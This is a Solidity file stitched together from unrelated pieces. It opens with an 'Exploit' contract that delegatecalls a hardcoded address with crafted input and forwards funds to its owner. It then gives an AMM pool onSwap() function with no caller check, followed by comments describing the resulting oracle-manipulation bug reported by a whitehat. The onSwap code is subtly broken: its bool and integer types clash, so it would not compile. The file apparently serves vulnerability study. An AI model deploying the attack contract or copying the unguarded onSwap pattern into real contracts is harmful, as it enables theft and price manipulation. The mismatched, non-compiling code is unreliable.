// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

contract Exploit {
    address payable private owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function exploit(bytes memory recipient) public payable {
        require(msg.sender == owner);

        bytes memory input = abi.encodePacked("\x00", recipient);
        uint input_size = 1 + recipient.length;

        assembly {
            let res := delegatecall(gas(), 0xe9271bc70b7ed1f598ddd3199e80b093fa71124f, add(input, 32), input_size, 0, 32)
        }

        owner.transfer(msg.value);
    }
}
function onSwap(
    SwapRequest memory request,
    uint256 reservesTokenIn,
    uint256 reservesTokenOut
) external override returns (uint256) {
    bool pTIn = request.tokenIn == _token0 ? pTIn = 0 : pTIn = 1;

    uint256 scalingFactorTokenIn = _scalingFactor(pTIn);
    uint256 scalingFactorTokenOut = _scalingFactor(!pTIn);

    // Upscale reserves to 18 decimals
    reservesTokenIn = _upscale(reservesTokenIn, scalingFactorTokenIn);
    reservesTokenOut = _upscale(reservesTokenOut, scalingFactorTokenOut);

    // Update oracle with upscaled reserves
    _updateOracle(
        request.lastChangeBlock,
        pTIn ? reservesTokenIn : reservesTokenOut,
        pTIn ? reservesTokenOut : reservesTokenIn
    );

    uint256 scale = AdapterLike(adapter).scale();
}
//The vulnerability that the whitehat identified was that the onSwap() 
//function on the Space AMM pool contract didn’t validate if the caller was the Balancer vault. 
//Hence, a malicious actor could have directly called the onSwap() function on the pool, 
//provided any price/reserves information to the oracle, and then have the oracle set that into the state. 
//The oracle would then read out as having that price recorded arbitrarily far into the past or future.